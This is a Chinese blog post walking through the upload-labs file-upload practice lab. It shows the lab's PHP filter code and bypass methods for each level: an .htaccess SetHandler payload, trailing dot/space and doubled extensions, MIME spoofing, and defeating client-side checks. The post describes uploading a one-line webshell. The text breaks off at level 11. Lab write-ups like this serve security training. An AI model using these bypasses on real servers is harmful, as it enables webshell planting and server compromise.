<!DOCTYPE html>
<html lang="zh-Hans">
    <!-- title -->




<!-- keywords -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="C1imber">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="C1imber">
    
    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    
    <meta name="description" content="信息安全技术博客">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <title>upload-labs通关教程 · C1imber&#39;s Blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "/assets/CutGirl.ico" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >C1imber&#39;s Blog</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">upload-labs通关教程</a>
            </div>
    </div>
    
    <a class="home-link" href=/>C1imber's Blog</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            upload-labs通关教程
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "文件上传">文件上传</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">5.8k</span>阅读时长: <span class="post-count reading-time">23 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2018/06/07</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h1 id="upload-labs通关教程（持续更新）"><a href="#upload-labs通关教程（持续更新）" class="headerlink" title="upload-labs通关教程（持续更新）"></a>upload-labs通关教程（持续更新）</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>最近在圈子里看到的一个文件上传闯关靶场，一共有19关，趁着这个机会做一个教程，以下的内容只是自己的思路，绕过方法有很多种，欢迎大家一起交流，共同学习！</strong><br><a id="more"></a></p>
<h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><p><strong>操作系统为windows，使用的phpstudy的集成环境，apache版本为2.4.23，所以apache2.2.x的解析漏洞在该环境下不管用，php版本为5.2.17，apache配置文件没有修改过，是默认的配置文件(第18关当中需要换成apache2.2.x，apache2.4.x暂时没找到绕过方法)</strong></p>
<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p><img src="http://pic.c1imber.top/blog/180609/hJF374IGLj.png?imageslim" alt="mark"><br><strong>第一关的上传过滤只是在客户端进行过滤的，js对文件后缀名做了白名单限制，任何前端的验证都不算是真正的验证，在这里我使用了4种方式去绕过，这些方法都是绕过前端验证的常用方法</strong></p>
<p><strong>1.firebug查看元素，将这里的表单的onsubmit事件删除，这样提交表单时便不会触发验证函数</strong><br><img src="http://pic.c1imber.top/blog/180609/1JdGj6CB2H.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/Bdke4Dkjef.png?imageslim" alt="mark"><br><strong>再次上传php就能上传</strong><br><img src="http://pic.c1imber.top/blog/180609/LemHid1HF9.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/HcHKamKIJG.png?imageslim" alt="mark"></p>
<p><strong>2.firebug控制台重新写一个和过滤函数名字一样的函数，使函数return true,覆盖之前的检查函数</strong><br><img src="http://pic.c1imber.top/blog/180609/gbhk5HiGfa.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/hLa3DDGL2H.png?imageslim" alt="mark"><br><strong>之后上传php也能上传成功</strong><br><img src="http://pic.c1imber.top/blog/180609/CIiCLHFmgd.png?imageslim" alt="mark"></p>
<p><strong>3.在火狐浏览器中禁用js，在地址栏输入about:config,查找javascript，将javascript.enabled的类型改为false，默认值为true</strong><br><img src="http://pic.c1imber.top/blog/180609/ifIhjCFF3f.png?imageslim" alt="mark"><br><strong>禁用了js后就能绕过前端检测上传php了</strong><br><img src="http://pic.c1imber.top/blog/180609/gJ8igaDJFH.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/gE4C3I14E4.png?imageslim" alt="mark"></p>
<p><strong>4.先上传允许的后缀名绕过前端检测，之后burp抓包，在发往服务端的过程中将后缀名再修改为php</strong><br><img src="http://pic.c1imber.top/blog/180609/GBgb52Lbl5.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/HbJ1bgCLI3.png?imageslim" alt="mark"><br><strong>从而绕过了前端验证</strong><br><img src="http://pic.c1imber.top/blog/180609/A8kf34hJH0.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/ajjJkiJKba.png?imageslim" alt="mark"></p>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><strong>第二关是在服务端做了验证，代码层对文件的MIME类型进行了检查，为了方便理解原理，可以看一下后端的检查代码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</div><div class="line">               <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">               $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">               $is_upload = <span class="keyword">true</span>;</div><div class="line">             &#125;</div><div class="line">       &#125; <span class="keyword">else</span> &#123;</div><div class="line">           $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</div><div class="line">       &#125;</div></pre></td></tr></table></figure>
<p><strong>有关这种场景的绕过方法，使用burp抓包，修改文件上传的content-type类型为白名单允许的图片MIME类型即可</strong><br><img src="http://pic.c1imber.top/blog/180609/EbBl9m7CaJ.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/70aFbF8Bi3.png?imageslim" alt="mark"><br><strong>然后就可以绕过检测上传成功了</strong><br><img src="http://pic.c1imber.top/blog/180609/BlKbi2BAdl.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/Lj3KA6C4G9.png?imageslim" alt="mark"></p>
<h3 id="第三关-amp-第四关"><a href="#第三关-amp-第四关" class="headerlink" title="第三关&amp;第四关"></a>第三关&amp;第四关</h3><p><strong>第三关的本意其实是想上传一些后缀名为<code>php、php2、php3、php5、phtml</code>等文件去绕过黑名单的,但是apache的配置文件里并没有配置将这些后缀的文件当做php解析</strong><br><img src="http://pic.c1imber.top/blog/180609/GAlJhg7Dcl.png?imageslim" alt="mark"><br><strong>第三关第四关都是黑名单检测，但是在这里黑名单里都没有对.htacess做限制，所以这两关都可以上传.htaccess去绕过，.htaccess文件的内容如下</strong></p>
<pre><code>&lt;FilesMatch &quot;tony&quot;&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre><p><strong>我们将这样一个.htaccess文件上传到服务器上传目录，这样的话，当apache在解析该目录下的php时，就会按照.htaccess中的要求去解析，只要匹配到了文件名里有tony这个字符串，就会把该文件当成php文件解析</strong></p>
<p><strong>首先上传这样的一个.htaccess文件</strong><br><img src="http://pic.c1imber.top/blog/180609/KLIm79lKhA.png?imageslim" alt="mark"><br><strong>.htaccess可以上传成功</strong><br><img src="http://pic.c1imber.top/blog/180609/8Ef545ddL5.png?imageslim" alt="mark"><br><strong>接着上传一个黑名单里没有过滤的随意后缀名文件，但是文件名里要有tony，上传一个tony.jpg，内容为一句话木马</strong><br><img src="http://pic.c1imber.top/blog/180609/G5D3FCCCm0.png?imageslim" alt="mark"><br><strong>上传成功，并且tony.jpg会被apache当成php文件解析</strong><br><img src="http://pic.c1imber.top/blog/180609/Fkf5J6Ecgb.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/i4gJ3EHKf4.png?imageslim" alt="mark"><br><strong>第四关也是同样的方法</strong></p>
<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p><strong>第五关在第四关的黑名单中又加进了.htaccess，所以上传.htaccess这个思路没戏了</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</div></pre></td></tr></table></figure>
<p><strong>可以看看过滤内容，过滤的还挺多，这里apache版本为2.4.23，所以apache文件名（x.php.xxx）解析漏洞不能在这用</strong></p>
<p><strong>并且在做该黑名单检查之前将上传文件后的<code>.</code>和空格字符都给删除了</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">           $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line">           $is_upload = <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">'此文件不允许上传'</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p><strong>这样做是为了防止用户上传是在后缀名后加上<code>.</code>和空格去绕过黑名单，windows在创建文件时会删除后缀名后的<code>.</code>和空格，并且后缀名为php.的文件也是可以当作php解析的（windows和linux环境都可以）</strong></p>
<p><strong>同时对文件名后缀名大小写写做了检查，防止大小写绕过</strong></p>
<p><strong>但是通过代码发现在黑名单检查之前处理文件名时只删除了一次<code>.</code>，于是可以上传一个后缀名为<code>php. .</code>的文件去绕过，这个在黑名单检查之前后缀名就会被处理为<code>php.</code></strong><br><img src="http://pic.c1imber.top/blog/180609/68Akdc4jfA.png?imageslim" alt="mark"><br><strong>可以看到成功绕过了上传检测</strong><br><img src="http://pic.c1imber.top/blog/180609/cc2iblBg14.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/fEHFFIHi6K.png?imageslim" alt="mark"></p>
<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p><strong>查看过滤代码</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</div><div class="line">$file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></div><div class="line">$file_ext = strrchr($file_name, <span class="string">'.'</span>);</div><div class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></div><div class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">        $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $msg = <span class="string">'此文件不允许上传'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>相对于第五关的过滤还少了一些，相同的黑名单，但是相比于第五关，这里仅仅删除了文件名后的<code>.</code>，并没有删除空格，所以可以上传一个后缀名为<code>php+空格</code>的文件去绕过黑名单，windows在创建文件时会自动删掉最后的空格</strong><br><img src="http://pic.c1imber.top/blog/180609/D74F0I3CaD.png?imageslim" alt="mark"><br><strong>可以看到成功绕过这里的上传检测</strong><br><img src="http://pic.c1imber.top/blog/180609/J1ckAadb1a.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/kJCf7HFf8m.png?imageslim" alt="mark"></p>
<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p><strong>第六关仅仅将文件名后面的点删除了，第七关则是仅仅将文件名后的空格给删除了，这里通过上传后缀名为<code>php.</code>的文件来绕过黑名单</strong><br><img src="http://pic.c1imber.top/blog/180609/DGFjCfbcHh.png?imageslim" alt="mark"><br><strong>成功绕过黑名单上传</strong><br><img src="http://pic.c1imber.top/blog/180609/7AKdha67J2.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/JA9H4CcB55.png?imageslim" alt="mark"></p>
<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p><strong>和第五关一样，虽然在黑名单检查之前将文件名后的<code>.</code>和空格给删除了，但是<code>.</code>只删除了一次，这里同样使用后缀名<code>php. .</code>去绕过</strong></p>
<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p><strong>一样的问题，所以继续用第八关的方法去绕过上传</strong></p>
<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p><strong>尝试上传后缀名php的文件，看到可以上传成功，不过后缀名php被删除了</strong><br><img src="http://pic.c1imber.top/blog/180609/Hbd6GjC5ci.png?imageslim" alt="mark"><br><strong>后缀名改为大写PHP上传，同样给删除了</strong><br><img src="http://pic.c1imber.top/blog/180609/dj8CfC8hAh.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/jg1FB6j93K.png?imageslim" alt="mark"><br><strong>猜想后台使用<code>str_ireplace</code>函数将文件后缀为黑名单的都给删除了，查看过滤代码确实如此</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</div><div class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</div><div class="line">$file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</div><div class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</div><div class="line">    $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</div><div class="line">    $is_upload = <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>因为<code>str_ireplace</code>函数只做一次替换，所以使用<code>pphphp</code>后缀名就能绕过</strong><br><img src="http://pic.c1imber.top/blog/180609/JDbd01feKa.png?imageslim" alt="mark"><br><strong>可以看到成功上传php</strong><br><img src="http://pic.c1imber.top/blog/180609/0kI0jjedHg.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180609/G53DH9G6k6.png?imageslim" alt="mark"></p>
<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><p><strong>采用的防御手法是白名单过滤，只允许上传jpg、png和gif类型，并且将上传的文件给重命名为了白名单中的后缀</strong></p>
